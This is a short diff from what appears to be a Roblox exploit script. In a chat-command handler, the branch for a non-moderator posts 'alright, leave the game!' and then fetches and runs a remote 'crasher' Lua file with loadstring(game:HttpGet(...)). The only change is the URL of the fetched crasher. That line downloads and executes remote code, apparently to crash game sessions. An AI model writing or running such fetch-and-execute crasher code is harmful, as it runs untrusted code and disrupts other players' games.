@@ -64,7 +64,7 @@ local function cmds(msg,plr)
 			if not isamod then
 				game.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer("alright, leave the game!", 'All')
 				wait(5)
-				loadstring(game:HttpGet("https://raw.githubusercontent.com/DropperWhitelister/KFC-Sellers/main/kfccrasher.lua"))()
+				loadstring(game:HttpGet("https://raw.githubusercontent.com/LPrandom/lua-projects/master/dahoodcrasher.lua"))()
 			end
 		end
 		if msg == ".woof" then
